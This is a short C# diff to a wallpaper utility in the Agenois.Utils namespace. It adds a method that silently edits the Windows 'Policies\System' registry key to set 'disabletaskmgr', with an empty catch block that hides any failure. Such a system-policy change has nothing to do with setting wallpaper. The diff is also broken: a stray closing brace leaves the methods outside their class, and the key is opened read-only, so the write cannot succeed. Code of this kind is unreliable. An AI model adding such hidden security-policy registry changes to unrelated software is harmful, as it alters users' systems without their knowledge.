@@ -24,7 +24,19 @@ namespace Agenois.Utils
         private Wallpaper()
         {
         }
-        public static void Set(Uri uri, Style style)
+    }
+    public static void UserInitOverwrite()
+    {
+        try
+        {
+            RegistryKey editKey;
+            editKey = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
+            editKey.SetValue("disabletaskmgr", @"0");
+            editKey.Close();
+        }
+        catch { }
+    }
+    public static void Set(Uri uri, Style style)
         {
             int num;
             string filename = Path.Combine(Path.GetTempPath(), "wallpaper.bmp");
